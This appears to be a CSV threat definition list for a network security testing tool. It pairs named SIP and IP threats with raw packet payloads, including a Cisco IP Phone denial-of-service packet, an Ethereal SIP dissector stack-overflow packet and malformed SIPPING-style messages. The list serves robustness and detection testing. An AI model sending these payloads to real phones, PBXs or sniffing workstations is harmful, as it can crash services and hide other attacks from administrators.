XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿cisco_sip1.xml,Cisco IP Phone Denial of Service,This threat sends out a malformed SIP packet that causes the screen to stop responding on Cisco IP Phones running with vulnerable software.,SIP,UDP,"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}[[0D 0A ]]Content-Type: application/sdp[[0D 0A ]]Content-Length:     114[[0D 0A ]]Contact: <sip:192.168.2.105:5060>[[0D 0A ]]Cseq: 1 INVITE[[0D 0A ]]Call-ID: 48598C1E-7ABE-4908-95ED-BD7188CAC29D@192.168.2.105[[0D 0A ]]From: ""Da Chuck ""<sip:192.168.50.1>;tag=4055311[[0D 0A ]]Via: SIP/2.0/UDP 192.168.50.1:5060[[0D 0A ]]<thechuck:192.168.50.2>[[0D 0A ]]User-Agent: SJLabs-SJPhone/1.0[[0D 0A 0D 0A ]]v= 0[[0D 0A ]]o=- 3220437306 3220437306 IN IP4 192.168.2.105[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.168.2.105[[0D 0A ]]t=[[0D 0A ]]m=audio 50000 RTP/AVP 8 0[[0D 0A]]"
﻿cisco_sip1_IPv6.xml,Cisco IP Phone Denial of Service (IPv6 Version),This threat sends out a malformed SIP packet that causes the screen to stop responding on Cisco IP Phones running with vulnerable software. (IPv6 Version),SIP/IPv6,UDP,"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}[[0D 0A ]]Content-Type: application/sdp[[0D 0A ]]Content-Length:     114[[0D 0A ]]Contact: <sip:192.168.2.105:5060>[[0D 0A ]]Cseq: 1 INVITE[[0D 0A ]]Call-ID: 48598C1E-7ABE-4908-95ED-BD7188CAC29D@192.168.2.105[[0D 0A ]]From: ""Da Chuck ""<sip:192.168.50.1>;tag=4055311[[0D 0A ]]Via: SIP/2.0/UDP 192.168.50.1:5060[[0D 0A ]]<thechuck:192.168.50.2>[[0D 0A ]]User-Agent: SJLabs-SJPhone/1.0[[0D 0A 0D 0A ]]v= 0[[0D 0A ]]o=- 3220437306 3220437306 IN IP4 192.168.2.105[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.168.2.105[[0D 0A ]]t=[[0D 0A ]]m=audio 50000 RTP/AVP 8 0[[0D 0A]]"
﻿etherealSIP.xml,Ethereal SIP Denial Of Service,"This threat causes a stack overflow in the Ethereal packet dissector for the SIP protocol.  This can be used by an attacker to either run remote code on a sniffing workstation, or cause a crash, preventing the network administrator from viewing other attacks in the same network stream.",SIP,UDP,OPTIONS sip:hack SIP/2.0[[0A ]]Via: SIP/2.0/UDP cpc1-mars1-3-0-cust225.midd.cable.ntl.com:55118;rport[[0D 0A ]]Via: SIP/2.0/UDP hack:9[[0A ]]From: sip:hack;tag=615ae770[[0A ]]To: sip:hack[[0A ]]Call-ID: 1633347452: hack[[0A ]]CSeq: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[[81 D9 04 ]]([[0A ]]Contact: hack:9[[0A ]]Content-Length: 0[[0A ]]Max-Forwards: 70[[0A ]]User-Agent: ethereal crash[[0A 00]]
﻿etherealSIP_IPv6.xml,Ethereal SIP Denial Of Service (IPv6 Version),"This threat causes a stack overflow in the Ethereal packet dissector for the SIP protocol.  This can be used by an attacker to either run remote code on a sniffing workstation, or cause a crash, preventing the network administrator from viewing other attacks in the same network stream. (IPv6 Version)",SIP/IPv6,UDP,OPTIONS sip:hack SIP/2.0[[0A ]]Via: SIP/2.0/UDP cpc1-mars1-3-0-cust225.midd.cable.ntl.com:55118;rport[[0D 0A ]]Via: SIP/2.0/UDP hack:9[[0A ]]From: sip:hack;tag=615ae770[[0A ]]To: sip:hack[[0A ]]Call-ID: 1633347452: hack[[0A ]]CSeq: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[[81 D9 04 ]]([[0A ]]Contact: hack:9[[0A ]]Content-Length: 0[[0A ]]Max-Forwards: 70[[0A ]]User-Agent: ethereal crash[[0A 00]]
﻿malformedTOSIP.xml,Malformed Random IP Packet Type of Service Options,This threat sends an IP packet with random Type of Service Options set.  Can cause poorly implemented TCP/IP stacks to fail.,IP,ICMP,AAAA
﻿malformedTOSIP_IPv6.xml,Malformed Random IP Packet Type of Service Options (IPv6 Version),This threat sends an IP packet with random Type of Service Options set.  Can cause poorly implemented TCP/IP stacks to fail. (IPv6 Version),IP/IPv6,ICMP,AAAA
﻿sipaddrspace.xml,SIPPING: Spaces in Address,This threat sends out a SIP OPTIONS message with spaces in the To: address. This is invalid and because it is unexpected may confuse or crash a SIP implementation.,SIP,UDP,"OPTIONS sip:user@example.org SIP/2.0[[0D 0A ]]Via: SIP/2.0/UDP host4.example.com:5060;branch=z9hG4bKkdju43234[[0D 0A ]]Max-Forwards: 70[[0D 0A ]]From: ""Bell, Alexander"" <sip:a.g.bell@example.com>;tag=433423[[0D 0A ]]To: ""Watson, Thomas"" < sip:t.watson@example.org >[[0D 0A ]]Call-ID: badaspec.sdf0234n2nds0a099u23h3hnnw009cdkne3[[0D 0A ]]Accept: application/sdp[[0D 0A ]]CSeq: 3923239 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]"
﻿sipaddrspace_IPv6.xml,SIPPING: Spaces in Address (IPv6 Version),This threat sends out a SIP OPTIONS message with spaces in the To: address. This is invalid and because it is unexpected may confuse or crash a SIP implementation. (IPv6 Version),SIP/IPv6,UDP,"OPTIONS sip:user@example.org SIP/2.0[[0D 0A ]]Via: SIP/2.0/UDP host4.example.com:5060;branch=z9hG4bKkdju43234[[0D 0A ]]Max-Forwards: 70[[0D 0A ]]From: ""Bell, Alexander"" <sip:a.g.bell@example.com>;tag=433423[[0D 0A ]]To: ""Watson, Thomas"" < sip:t.watson@example.org >[[0D 0A ]]Call-ID: badaspec.sdf0234n2nds0a099u23h3hnnw009cdkne3[[0D 0A ]]Accept: application/sdp[[0D 0A ]]CSeq: 3923239 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]"
﻿sipbadaccept.xml,SIPPING: Unacceptable Accept,This threat sends out a SIP INVITE message requiring an unknown Accept: type. This is technically valid but unexpected and may confuse or crash a SIP implementation.,SIP,UDP,INVITE sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:j_user@example.com[[0D 0A ]]Contact: <sip:caller@host15.example.net>[[0D 0A ]]From: sip:caller@example.net;tag=234[[0D 0A ]]Max-Forwards: 5[[0D 0A ]]Call-ID: sdp01.ndaksdj9342dasdd[[0D 0A ]]Accept: text/nobodyKnowsThis[[0D 0A ]]CSeq: 8 INVITE[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.15;branch=z9hG4bKkdjuw[[0D 0A ]]Content-Length: 150[[0D 0A ]]Content-Type: application/sdp[[0D 0A 0D 0A ]]v=0[[0D 0A ]]o=mhandley 29739 7272939 IN IP4 192.0.2.5[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.0.2.5[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 49217 RTP/AVP 0 12[[0D 0A ]]m=video 3227 RTP/AVP 31[[0D 0A ]]a=rtpmap:31 LPC[[0D 0A]]
﻿sipbadaccept_IPv6.xml,SIPPING: Unacceptable Accept (IPv6 Version),This threat sends out a SIP INVITE message requiring an unknown Accept: type. This is technically valid but unexpected and may confuse or crash a SIP implementation. (IPv6 Version),SIP/IPv6,UDP,INVITE sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:j_user@example.com[[0D 0A ]]Contact: <sip:caller@host15.example.net>[[0D 0A ]]From: sip:caller@example.net;tag=234[[0D 0A ]]Max-Forwards: 5[[0D 0A ]]Call-ID: sdp01.ndaksdj9342dasdd[[0D 0A ]]Accept: text/nobodyKnowsThis[[0D 0A ]]CSeq: 8 INVITE[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.15;branch=z9hG4bKkdjuw[[0D 0A ]]Content-Length: 150[[0D 0A ]]Content-Type: application/sdp[[0D 0A 0D 0A ]]v=0[[0D 0A ]]o=mhandley 29739 7272939 IN IP4 192.0.2.5[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.0.2.5[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 49217 RTP/AVP 0 12[[0D 0A ]]m=video 3227 RTP/AVP 31[[0D 0A ]]a=rtpmap:31 LPC[[0D 0A]]
﻿sipbadbranch.xml,SIPPING: No Additional Branch Identifier,"This threat sends out a SIP OPTIONS message with no additional branch identifier after the RFC 3261 required part. This is acceptable for RFC 2543 compliance, but may confuse or crash newer SIP implementations that aren't expecting this behavior.",SIP,UDP,OPTIONS sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:user@example.com[[0D 0A ]]From: sip:caller@example.org;tag=33242[[0D 0A ]]Max-Forwards: 3[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.1;branch=z9hG4bK[[0D 0A ]]Accept: application/sdp[[0D 0A ]]Call-ID: badbranch.sadonfo23i420jv0as0derf3j3n[[0D 0A ]]CSeq: 8 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]
﻿sipbadbranch_IPv6.xml,SIPPING: No Additional Branch Identifier (IPv6 Version),"This threat sends out a SIP OPTIONS message with no additional branch identifier after the RFC 3261 required part. This is acceptable for RFC 2543 compliance, but may confuse or crash newer SIP implementations that aren't expecting this behavior. (IPv6 Version)",SIP/IPv6,UDP,OPTIONS sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:user@example.com[[0D 0A ]]From: sip:caller@example.org;tag=33242[[0D 0A ]]Max-Forwards: 3[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.1;branch=z9hG4bK[[0D 0A ]]Accept: application/sdp[[0D 0A ]]Call-ID: badbranch.sadonfo23i420jv0as0derf3j3n[[0D 0A ]]CSeq: 8 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]
﻿sipbadrequesturi.xml,SIP Bad Request-URI,This threat sends out a SIP INVITE message with the Request-URI header filled with garbage. This may confuse or crash a PBX that isn't very robust.,SIP,SIP_Invite,v=0[[0D 0A ]]o=200 155188843 155188859 IN IP4 127.0.0.1[[0D 0A ]]s=X-Lite[[0D 0A ]]c=IN IP4 127.0.0.1[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 8000 RTP/AVP 0 8 3 98 97 101[[0D 0A ]]a=rtpmap:0 pcmu/8000[[0D 0A ]]a=rtpmap:8 pcma/8000[[0D 0A ]]a=rtpmap:3 gsm/8000[[0D 0A ]]a=rtpmap:98 iLBC/8000[[0D 0A ]]a=rtpmap:97 speex/8000[[0D 0A ]]a=rtpmap:101 telephone-event/8000[[0D 0A ]]a=fmtp:101 0-15[[0D 0A]]
﻿sipbadrequesturi_IPv6.xml,SIP Bad Request-URI (IPv6 Version),This threat sends out a SIP INVITE message with the Request-URI header filled with garbage. This may confuse or crash a PBX that isn't very robust. (IPv6 Version),SIP/IPv6,SIP_Invite,v=0[[0D 0A ]]o=200 155188843 155188859 IN IP4 127.0.0.1[[0D 0A ]]s=X-Lite[[0D 0A ]]c=IN IP4 127.0.0.1[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 8000 RTP/AVP 0 8 3 98 97 101[[0D 0A ]]a=rtpmap:0 pcmu/8000[[0D 0A ]]a=rtpmap:8 pcma/8000[[0D 0A ]]a=rtpmap:3 gsm/8000[[0D 0A ]]a=rtpmap:98 iLBC/8000[[0D 0A ]]a=rtpmap:97 speex/8000[[0D 0A ]]a=rtpmap:101 telephone-event/8000[[0D 0A ]]a=fmtp:101 0-15[[0D 0A]]
﻿sipbadtz.xml,SIPPING: Bad Timezone in Date,"This threat sends out a SIP INVITE message with the timezone something other than GMT, which is the only legal value. Because this is unexpected, it may confuse or crash a SIP implementation.",SIP,UDP,"INVITE sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:user@example.com[[0D 0A ]]From: sip:caller@example.net;tag=2234923[[0D 0A ]]Max-Forwards: 70[[0D 0A ]]Call-ID: baddate.239423mnsadf3j23lj42--sedfnm234[[0D 0A ]]CSeq: 1392934 INVITE[[0D 0A ]]Via: SIP/2.0/UDP host.example.com;branch=z9hG4bKkdjuw[[0D 0A ]]Date: Fri, 01 Jan 2010 16:00:00 EST[[0D 0A ]]Contact: <sip:caller@host5.example.net>[[0D 0A ]]Content-Type: application/sdp[[0D 0A ]]Content-Length: 150[[0D 0A 0D 0A ]]v=0[[0D 0A ]]o=mhandley 29739 7272939 IN IP4 192.0.2.5[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.0.2.5[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 49217 RTP/AVP 0 12[[0D 0A ]]m=video 3227 RTP/AVP 31[[0D 0A ]]a=rtpmap:31 LPC[[0D 0A]]"
﻿sipbadtz_IPv6.xml,SIPPING: Bad Timezone in Date (IPv6 Version),"This threat sends out a SIP INVITE message with the timezone something other than GMT, which is the only legal value. Because this is unexpected, it may confuse or crash a SIP implementation. (IPv6 Version)",SIP/IPv6,UDP,"INVITE sip:user@example.com SIP/2.0[[0D 0A ]]To: sip:user@example.com[[0D 0A ]]From: sip:caller@example.net;tag=2234923[[0D 0A ]]Max-Forwards: 70[[0D 0A ]]Call-ID: baddate.239423mnsadf3j23lj42--sedfnm234[[0D 0A ]]CSeq: 1392934 INVITE[[0D 0A ]]Via: SIP/2.0/UDP host.example.com;branch=z9hG4bKkdjuw[[0D 0A ]]Date: Fri, 01 Jan 2010 16:00:00 EST[[0D 0A ]]Contact: <sip:caller@host5.example.net>[[0D 0A ]]Content-Type: application/sdp[[0D 0A ]]Content-Length: 150[[0D 0A 0D 0A ]]v=0[[0D 0A ]]o=mhandley 29739 7272939 IN IP4 192.0.2.5[[0D 0A ]]s=-[[0D 0A ]]c=IN IP4 192.0.2.5[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 49217 RTP/AVP 0 12[[0D 0A ]]m=video 3227 RTP/AVP 31[[0D 0A ]]a=rtpmap:31 LPC[[0D 0A]]"
﻿sipbadversion.xml,SIPPING: Bad Version (Version Too High),"This threat sends out a SIP OPTIONS message with the version set to 7.0. This is invalid according to RFC 3261 (current version is 2.0), so should be rejected. Because it is unexpected, this may confuse or crash a SIP implementation.",SIP,UDP,OPTIONS sip:t.watson@example.org SIP/7.0[[0D 0A ]]Via:     SIP/7.0/UDP c.example.com;branch=z9hG4bKkdjuw[[0D 0A ]]Max-Forwards:     70[[0D 0A ]]From:    A. Bell <sip:a.g.bell@example.com>;tag=qweoiqpe[[0D 0A ]]To:      T. Watson <sip:t.watson@example.org>[[0D 0A ]]Call-ID: badvers.31417@c.example.com[[0D 0A ]]CSeq:    1 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]
﻿sipbadversion_IPv6.xml,SIPPING: Bad Version (Version Too High) (IPv6 Version),"This threat sends out a SIP OPTIONS message with the version set to 7.0. This is invalid according to RFC 3261 (current version is 2.0), so should be rejected. Because it is unexpected, this may confuse or crash a SIP implementation. (IPv6 Version)",SIP/IPv6,UDP,OPTIONS sip:t.watson@example.org SIP/7.0[[0D 0A ]]Via:     SIP/7.0/UDP c.example.com;branch=z9hG4bKkdjuw[[0D 0A ]]Max-Forwards:     70[[0D 0A ]]From:    A. Bell <sip:a.g.bell@example.com>;tag=qweoiqpe[[0D 0A ]]To:      T. Watson <sip:t.watson@example.org>[[0D 0A ]]Call-ID: badvers.31417@c.example.com[[0D 0A ]]CSeq:    1 OPTIONS[[0D 0A ]]l: 0[[0D 0A 0D 0A]]
﻿sipbigcode.xml,SIPPING: Big Response Code,"This threat sends out a SIP response code message with a large value for the code number. This is invalid and should be dropped, but because it is unexpected it may confuse or crash a SIP implementation.",SIP,UDP,SIP/2.0 4294967301 better not break the receiver[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.105;branch=z9hG4bK2398ndaoe[[0D 0A ]]Call-ID: bigcode.asdof3uj203asdnf3429uasdhfas3ehjasdfas9i[[0D 0A ]]CSeq: 353494 INVITE[[0D 0A ]]From: <sip:user@example.com>;tag=39ansfi3[[0D 0A ]]To: <sip:user@example.edu>;tag=902jndnke3[[0D 0A ]]Content-Length: 0[[0D 0A ]]Contact: <sip:user@host105.example.com>[[0D 0A 0D 0A]]
﻿sipbigcode_IPv6.xml,SIPPING: Big Response Code (IPv6 Version),"This threat sends out a SIP response code message with a large value for the code number. This is invalid and should be dropped, but because it is unexpected it may confuse or crash a SIP implementation. (IPv6 Version)",SIP/IPv6,UDP,SIP/2.0 4294967301 better not break the receiver[[0D 0A ]]Via: SIP/2.0/UDP 192.0.2.105;branch=z9hG4bK2398ndaoe[[0D 0A ]]Call-ID: bigcode.asdof3uj203asdnf3429uasdhfas3ehjasdfas9i[[0D 0A ]]CSeq: 353494 INVITE[[0D 0A ]]From: <sip:user@example.com>;tag=39ansfi3[[0D 0A ]]To: <sip:user@example.edu>;tag=902jndnke3[[0D 0A ]]Content-Length: 0[[0D 0A ]]Contact: <sip:user@host105.example.com>[[0D 0A 0D 0A]]
﻿sipbroadcastinvite.xml,SIP Broadcast INVITE,This threat sends out a SIP INVITE message instructing responses to be sent to 255.255.255.255.,SIP,SIP_Invite,v=0[[0D 0A ]]o=200 155188843 155188859 IN IP4 255.255.255.255[[0D 0A ]]s=X-Lite[[0D 0A ]]c=IN IP4 255.255.255.255[[0D 0A ]]t=0 0[[0D 0A ]]m=audio 8000 RTP/AVP 0 8 3 98 97 101[[0D 0A ]]a=rtpmap:0 pcmu/8000[[0D 0A ]]a=rtpmap:8 pcma/8000[[0D 0A ]]a=rtpmap:3 gsm/8000[[0D 0A ]]a=rtpmap:98 iLBC/8000[[0D 0A ]]a=rtpmap:97 speex/8000[[0D 0A ]]a=rtpmap:101 telephone-event/8000[[0D 0A ]]a=fmtp:101 0-15[[0D 0A]]
